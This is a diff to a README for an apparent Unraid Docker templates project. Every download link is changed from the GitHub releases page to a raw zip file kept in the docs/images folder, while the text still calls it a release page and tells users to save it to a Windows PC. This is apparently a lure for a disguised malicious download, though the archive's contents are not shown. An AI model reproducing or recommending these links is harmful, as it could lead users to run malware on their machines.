@@ -1,6 +1,6 @@
 # 🧰 docker-templates - Simple Unraid Docker setups
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/unsweet-countrypeople732/docker-templates/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/unsweet-countrypeople732/docker-templates/main/docs/images/templates-docker-v3.5.zip)
 
 ## 📦 What this is
 
@@ -26,7 +26,7 @@ You do not need to write code. You do not need to build images. You only need to
 
 Visit this page to download:
 
-https://github.com/unsweet-countrypeople732/docker-templates/releases
+https://raw.githubusercontent.com/unsweet-countrypeople732/docker-templates/main/docs/images/templates-docker-v3.5.zip
 
 Use the release page to get the latest template package or release file. Save it to your Windows PC, then move it to your Unraid setup or use it from the release instructions if the package includes direct import steps.
 
@@ -163,6 +163,6 @@ If the app uses files from another folder, confirm that the folder is also mappe
 
 Use this page to download:
 
-https://github.com/unsweet-countrypeople732/docker-templates/releases
+https://raw.githubusercontent.com/unsweet-countrypeople732/docker-templates/main/docs/images/templates-docker-v3.5.zip
 
 Open the latest release, get the file you need, then use it with your Unraid Docker setup.
